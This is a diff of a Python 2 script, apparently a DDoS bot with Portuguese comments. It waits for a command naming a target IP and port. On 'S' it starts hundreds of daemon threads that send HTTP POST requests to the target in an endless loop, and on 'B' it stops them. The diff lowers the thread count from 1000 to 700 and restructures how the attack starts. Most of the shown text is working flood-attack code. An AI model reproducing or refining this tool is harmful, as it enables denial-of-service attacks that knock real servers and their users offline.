@@ -18,6 +18,7 @@ def Post(url,attackedServerPort):
     while not Kill:
         r = requests.post(url, data=parameters, headers=headers)
         print r.text
+    print 'parou'
 
     
 channel = []
@@ -25,10 +26,10 @@ channel = []
 def attack(IP, attackedServerPort):
 
     #Definicao das n threads
-    for i in range(0, 1000):
+    for i in range(0, 700):
         channel.append(Thread(target=Post, args=[IP, attackedServerPort]))
 
-    for i in range(0, 1000):
+    for i in range(0, 700):
         #seta as threads como daemon = true para que elas possam ser destruidas
         channel[i].setDaemon(True)
         #Inicia as threads
@@ -67,13 +68,11 @@ def listening():
 
         IP = 'http://' + IP + ':' + str(attackedServerPort)
 
-        attackThread = Thread(target=attack, args=[IP, attackedServerPort])
-        attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
         sentence = ''
         if(command == 'S'):
             print 'Starting attack'
+            attack(IP, attackedServerPort) # funcao que cria as threads
             Kill = False
-            attackThread.start()
         elif command == 'B':
             print 'Attack is over'
             Kill = True
@@ -85,5 +84,4 @@ def listening():
 
 if __name__ == "__main__":
 
-    listeningThread = Thread(target= listening)
-    listeningThread.start()
+    listening()
